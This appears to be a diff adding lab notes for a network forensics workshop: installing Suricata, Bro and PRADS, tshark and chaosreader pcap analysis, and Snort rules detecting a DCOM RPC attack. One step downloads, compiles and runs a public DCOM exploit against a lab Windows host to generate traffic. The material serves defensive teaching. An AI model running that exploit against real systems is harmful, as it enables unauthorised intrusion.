@@ -1,0 +1,425 @@
+##########
+# VMWare #
+##########
+- For this workshop you'll need the latest version of VMWare Workstation (Windows), Fusion (Mac), or Player.
+
+- http://www.vmware.com/ap/products/player.html
+
+
+- Although you can get the VM to run in VirtualBox, I will not be supporting this configuration for this class.
+
+
+
+#########################
+# Class Virtual Machine #
+#########################
+ 
+ 
+Here is the VMWare virtual machine for the class:
+ 
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
+user:      infosecaddicts
+pass:      infosecaddicts
+
+
+
+##################################################################
+# Setting up your virtual machine
+#
+##################################################################
+
+
+
+######################################################################################
+# Installing Suricata, Bro, and Prads                                                #
+# Reference:                                                                         #
+# https://blog.rapid7.com/2017/02/14/how-to-install-suricata-nids-on-ubuntu-linux/   #
+# https://www.vultr.com/docs/installing-bro-ids-on-ubuntu-16-04                      #
+# https://www.howtoinstall.co/en/ubuntu/trusty/prads                                 #
+######################################################################################
+
+
+
+---------------------------Type This-----------------------------------
+apt-get install -y libpcre3-dbg libpcre3-dev autoconf automake libtool libpcap-dev libnet1-dev libyaml-dev libjansson4 libcap-ng-dev libmagic-dev libjansson-dev zlib1g-dev
+
+apt-get install -y libnetfilter-queue-dev libnetfilter-queue1 libnfnetlink-dev
+
+wget https://www.openinfosecfoundation.org/download/suricata-3.2.tar.gz
+
+tar -xvzf suricata-3.2.tar.gz
+
+cd suricata-3.2 
+
+./configure --enable-nfqueue --prefix=/usr --sysconfdir=/etc --localstatedir=/var
+
+make 
+
+make install
+
+make install-conf
+
+add-apt-repository ppa:oisf/suricata-stable
+
+apt-get install suricata suricata-dbg -y
+-----------------------------------------------------------------------
+
+
+
+Install Dependencies
+Next we will need to install all the required packages onto your server.
+---------------------------Type This-----------------------------------
+sudo apt-get install cmake make gcc g++ flex bison libpcap-dev libssl-dev python-dev swig zlib1g-dev sendmail sendmail-bin
+
+
+Install Bro
+Next we will install Bro 2.5.2 from source. 
+---------------------------Type This-----------------------------------
+sudo mkdir -p /nsm/bro
+cd ~
+wget https://www.bro.org/downloads/bro-2.5.2.tar.gz
+tar -xvzf bro-2.5.2.tar.gz
+cd bro-2.5.2
+./configure --prefix=/nsm/bro
+make
+sudo make install
+export PATH=/nsm/bro/bin:$PATH
+-----------------------------------------------------------------------
+
+
+
+
+Configure Bro
+First we will tell Bro which interface we would like to monitor. This is done be editing the configuration file /nsm/bro/etc/node.cfg.
+---------------------------Type This-----------------------------------
+sudo nano /nsm/bro/etc/node.cfg
+-----------------------------------------------------------------------
+
+
+Find the line interface=eth0 and change it to your interface.
+---------------------------Type This-----------------------------------
+interface=ens3
+-----------------------------------------------------------------------
+
+
+You can find which interface you are using with the following.
+---------------------------Type This-----------------------------------
+ifconfig
+-----------------------------------------------------------------------
+
+
+Next we will need to tell Bro where to send the log email by adding your email address to /nsm/bro/etc/broctl.cfg.
+---------------------------Type This-----------------------------------
+sudo nano /nsm/bro/etc/broctl.cfg
+-----------------------------------------------------------------------
+
+
+Find the MailTo line and add your email address.
+---------------------------Type This-----------------------------------
+MailTo = sammy@example.com
+-----------------------------------------------------------------------
+
+
+
+Launch Bro
+Bro is started using BroControl, which we will need to install.
+---------------------------Type This-----------------------------------
+sudo /nsm/bro/bin/broctl
+install
+exit
+-----------------------------------------------------------------------
+
+
+Now you can start Bro.
+---------------------------Type This-----------------------------------
+sudo /nsm/bro/bin/broctl deploy
+-----------------------------------------------------------------------
+
+
+Next we will set Bro to run on startup by adding it to /etc/rc.local.
+---------------------------Type This-----------------------------------
+sudo nano /etc /rc.local
+-----------------------------------------------------------------------
+
+
+Add the following line, then close and save the file.
+---------------------------Type This-----------------------------------
+/nsm/bro/bin/broctl start
+-----------------------------------------------------------------------
+
+
+
+
+---------------------------Type This-----------------------------------
+sudo apt-get install prads
+-----------------------------------------------------------------------
+
+
+
+
+
+
+#################
+# PCAP Analysis #
+#################
+---------------------------Type This-----------------------------------
+cd ~/Desktop/
+ 
+mkdir suspiciouspcap/
+ 
+cd suspiciouspcap/
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/suspicious-time.pcap
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/chaosreader.pl
+ 
+ 
+perl chaosreader.pl suspicious-time.pcap
+ 
+firefox index.html
+ 
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)"
+ 
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)" | awk '{print $4, $5, $6}' | sort | uniq -c | sort -nr
+ 
+ 
+for i in session_00[0-9]*.http.html; do srcip=`cat "$i" | grep 'http:\ ' | awk '{print $2}' |  cut -d ':' -f1`; dstip=`cat "$i" | grep 'http:\ ' | awk '{print $4}' |  cut -d ':' -f1`; host=`cat "$i" | grep 'Host:\ ' | sort -u | sed -e 's/Host:\ //g'`; echo "$srcip --> $dstip = $host";  done | sort -u
+------------------------------------------------------------------------
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+#############################
+# PCAP Analysis with tshark #
+#############################
+---------------------------Type This-----------------------------------
+sudo tshark -i eth0 -r suspicious-time.pcap -qz io,phs
+ 
+ 
+tshark -r suspicious-time.pcap | grep 'NB.*20\>' | sed -e 's/<[^>]*>//g' | awk '{print $3,$4,$9}' | sort -u
+ 
+ 
+tshark -r suspicious-time.pcap | grep 'NB.*1e\>' | sed -e 's/<[^>]*>//g' | awk '{print $3,$4,$9}' | sort -u
+ 
+ 
+tshark -r suspicious-time.pcap arp | grep has | awk '{print $3," -> ",$9}' | tr -d '?'
+ 
+ 
+tshark -r suspicious-time.pcap -Tfields -e "eth.src" | sort | uniq
+ 
+ 
+tshark -r suspicious-time.pcap -R "browser.command==1" -Tfields -e "ip.src" -e "browser.server" | uniq
+ 
+tshark -r suspicious-time.pcap -Tfields -e "eth.src" | sort |uniq
+ 
+tshark -r suspicious-time.pcap -qz ip_hosts,tree
+ 
+tshark -r suspicious-time.pcap -R "http.request" -Tfields -e "ip.src" -e "http.user_agent" | uniq
+ 
+tshark -r suspicious-time.pcap -R "dns" -T fields -e "ip.src" -e "dns.flags.response" -e "dns.qry.name"
+ 
+ 
+whois rapidshare.com.eyu32.ru
+ 
+whois sploitme.com.cn
+ 
+ 
+tshark -r suspicious-time.pcap -R http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}'
+ 
+tshark -r suspicious-time.pcap -R http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico' -e google -e 'honeynet.org'
+ 
+tshark -r suspicious-time.pcap -qz http_req,tree
+ 
+tshark -r suspicious-time.pcap -R "data-text-lines contains \"<script\"" -T fields -e frame.number -e ip.src -e ip.dst
+ 
+tshark -r suspicious-time.pcap -R http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico'  | grep 10.0.3.15 | sed -e 's/\?[^cse].*/\?\.\.\./g'
+ 
+ 
+ 
+######################################
+# PCAP Analysis with forensicPCAP.py #
+######################################
+---------------------------Type This-----------------------------------
+cd ~/Desktop/suspiciouspcap/
+ 
+wget https://raw.githubusercontent.com/madpowah/ForensicPCAP/master/forensicPCAP.py
+ 
+sudo pip install cmd2==0.7.9
+ 
+ 
+python forensicPCAP.py suspicious-time.pcap
+------------------------------------------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+ForPCAP >>> help
+------------------------------------------------------------------------
+ 
+Prints stats about PCAP
+---------------------------Type This-----------------------------------
+ForPCAP >>> stat
+------------------------------------------------------------------------
+ 
+Prints all DNS requests from the PCAP file. The id before the DNS is the packet's id which can be use with the "show" command.
+---------------------------Type This-----------------------------------
+ForPCAP >>> dns
+ 
+ForPCAP >>> show
+------------------------------------------------------------------------
+ 
+Prints all destination ports from the PCAP file. The id before the DNS is the packet's id which can be use with the "show" command.
+---------------------------Type This-----------------------------------
+ForPCAP >>> dstports
+ 
+ForPCAP >>> show
+---------------------------Type This-----------------------------------
+ 
+Prints the number of ip source and store them.
+---------------------------Type This-----------------------------------
+ForPCAP >>> ipsrc
+ 
+ForPCAP >>> show
+------------------------------------------------------------------------
+ 
+Prints the number of web's requests and store them
+ForPCAP >>> web
+ 
+ForPCAP >>> show
+------------------------------------------------------------------------
+ 
+ 
+Prints the number of mail's requests and store them
+---------------------------Type This-----------------------------------
+ForPCAP >>> mail
+ 
+ForPCAP >>> show
+------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+###########################
+# Understanding IDS rules #
+###########################
+Field 1: Action - Snort can process events in 1 of 3 ways (alert, log, drop)
+ 
+Field 2: Protocol - Snort understands a few types of traffic (tcp, udp, icmp)
+ 
+Field 3: Source IP (can be a variable like $External_Net, or an IP, or a range)
+ 
+Field 4: Source Port (can be a variable like $WebServer_Ports, or a port number, or a range of ports)
+ 
+Field 5: Traffic Direction (->)
+ 
+Field 6: Destination IP (can be a variable like $External_Net, or an IP, or a range)
+ 
+Field 7: Destination Port (can be a variable like $WebServer_Ports, or a port number, or a range of ports)
+ 
+Field 8: MSG - what is actually displayed on the analysts machine
+ 
+ 
+Let's look at 2 simple rules
+----------------------------------------------------------------------------------
+alert tcp $EXTERNAL_NET any -> $HOME_NET 135 (msg:”NETBIOS DCERPC ISystemActivator \
+bind attempt”; flow:to_server,established; content:”|05|”; distance:0; within:1; \
+content:”|0b|”; distance:1; within:1; byte_test:1,&,1,0,relative; content:”|A0 01 00 \
+00 00 00 00 00 C0 00 00 00 00 00 00 46|”; distance:29; within:16; \
+reference:cve,CAN-2003-0352; classtype:attempted-admin; sid:2192; rev:1;)
+ 
+alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:”NETBIOS SMB DCERPC ISystemActivator bind \
+attempt”; flow:to_server,established; content:”|FF|SMB|25|”; nocase; offset:4; \
+depth:5; content:”|26 00|”; distance:56; within:2; content:”|5c \
+00|P|00|I|00|P|00|E|00 5c 00|”; nocase; distance:5; within:12; content:”|05|”; \
+distance:0; within:1; content:”|0b|”; distance:1; within:1; \
+byte_test:1,&,1,0,relative; content:”|A0 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 \
+46|”; distance:29; within:16; reference:cve,CAN-2003-0352; classtype:attempted-admin; \
+sid:2193; rev:1;)
+----------------------------------------------------------------------------------
+ 
+ 
+ 
+From your Linux machine ping your Windows machine
+---------------------------Type This-----------------------------------
+ping 192.168.150.1
+-----------------------------------------------------------------------
+ 
+ 
+Start wireshark and let's create some simple filters:
+ 
+Filter 1:
+---------------------------Type This-----------------------------------
+ip.addr==192.168.150.1
+-----------------------------------------------------------------------
+ 
+Filter 2:
+---------------------------Type This-----------------------------------
+ip.addr==192.168.150.1 && icmp
+-----------------------------------------------------------------------
+ 
+ 
+Filter 3:
+---------------------------Type This-----------------------------------
+ip.addr==192.168.150.1 && !(tcp.port==22)
+-----------------------------------------------------------------------
+Now stop your capture and restart it (make sure you keep the filter)
+ 
+ 
+ 
+ 
+Back to your Linux machine:
+[ CTRL-C ] - to stop your ping
+---------------------------Type This-----------------------------------
+wget http://downloads.securityfocus.com/vulnerabilities/exploits/oc192-dcom.c
+ 
+ 
+gcc -o exploit oc192-dcom.c
+ 
+./exploit
+ 
+ 
+./exploit -d 192.168.150.1 -t 0
+ -----------------------------------------------------------------------
+ 
+ 
+ 
+Now go back to WireShark and stop the capture.
+
+
+
+
+
+
+##################################################################
+# Analyzing a PCAP with Suricata, Bro, and Prads                 # 
+# Reference:                                                     #
+# https://chrissanders.org/2018/05/large-captures3-distillation/ #
+##################################################################
+
+---------------------------Type This-----------------------------------
+suricata -c suricata.yaml -r suspicious-time.pcap -l suri/
+
+bro -r suspicious-time.pcap
+
+prads -r suspicious-time.pcap
+-----------------------------------------------------------------------
+
+
+
+###############################################
+# Packet Analysis/Network Forensics Challenge #
+###############################################
+
+In order to receive your certificate of proficiency you must complete all of the tasks covered in the Packet Analysis/Network Forensics pastebin (http://pastebin.com/SwgnkAhQ).
+
+Submit the results via email in an MS Word document with (naming convention example: YourFirstName-YourLastName-PA-NF-Challenge.docx)
+
+
+
+
+IMPORTANT NOTE:
+Your homework/challenge must be submitted via email to both (joe-at-strategicsec-.-com and kasheia-at-strategicsec-.-com) by Sunday October 23rd at midnight EST.
